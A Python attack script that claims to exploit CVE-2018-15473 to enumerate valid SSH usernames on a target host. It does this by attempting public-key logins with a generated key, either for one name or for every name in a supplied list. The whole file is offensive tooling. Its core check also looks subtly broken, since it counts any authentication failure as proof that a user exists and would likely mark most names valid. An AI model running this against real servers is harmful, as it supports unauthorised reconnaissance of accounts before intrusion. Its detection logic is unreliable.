#!/usr/bin/env python3

import argparse
import logging
import paramiko
import socket
import sys

# Suppress paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

class SSHUsernameEnumeration:
    def __init__(self, host, port):
        self.host = host
        self.port = port
    
    def check_username(self, username):
        """
        Test for CVE-2018-15473 SSH Username Enumeration
        Returns True if username exists, False otherwise
        """
        try:
            sock = socket.socket()
            sock.settimeout(10)
            sock.connect((self.host, self.port))
            
            transport = paramiko.transport.Transport(sock)
            transport.start_client()
            
            # Try authentication with fake key
            try:
                key = paramiko.RSAKey.generate(1024)
                transport.auth_publickey(username, key)
            except paramiko.AuthenticationException:
                # Expected - authentication failed but username exists
                transport.close()
                return True
            except paramiko.SSHException as e:
                # Username doesn't exist - connection rejected early
                transport.close()
                return False
            except Exception as e:
                transport.close()
                return None
            
            # Should not reach here
            transport.close()
            return None
            
        except Exception as e:
            print(f"Error testing {username}: {e}")
            return None

def main():
    parser = argparse.ArgumentParser(description='CVE-2018-15473 SSH Username Enumeration')
    parser.add_argument('host', help='Target hostname or IP')
    parser.add_argument('--port', type=int, default=22, help='SSH port (default: 22)')
    parser.add_argument('--username', help='Single username to test')
    parser.add_argument('--userlist', help='File containing usernames')
    
    args = parser.parse_args()
    
    enumerator = SSHUsernameEnumeration(args.host, args.port)
    
    if args.username:
        result = enumerator.check_username(args.username)
        if result is True:
            print(f"[+] {args.username} is a VALID user")
        elif result is False:
            print(f"[-] {args.username} is NOT a valid user")
        else:
            print(f"[?] {args.username} result unclear")
    
    elif args.userlist:
        try:
            with open(args.userlist, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
            
            valid_users = []
            invalid_users = []
            
            for username in usernames:
                print(f"[*] Testing: {username}")
                result = enumerator.check_username(username)
                
                if result is True:
                    print(f"[+] {username} is VALID")
                    valid_users.append(username)
                elif result is False:
                    print(f"[-] {username} is NOT valid")
                    invalid_users.append(username)
                else:
                    print(f"[?] {username} result unclear")
            
            print("\n=== RESULTS ===")
            print(f"Valid users ({len(valid_users)}):")
            for user in valid_users:
                print(f"  + {user}")
            
        except FileNotFoundError:
            print(f"Error: File {args.userlist} not found")
            sys.exit(1)
    
    else:
        print("Error: Must specify --username or --userlist")
        sys.exit(1)

if __name__ == "__main__":
    main()
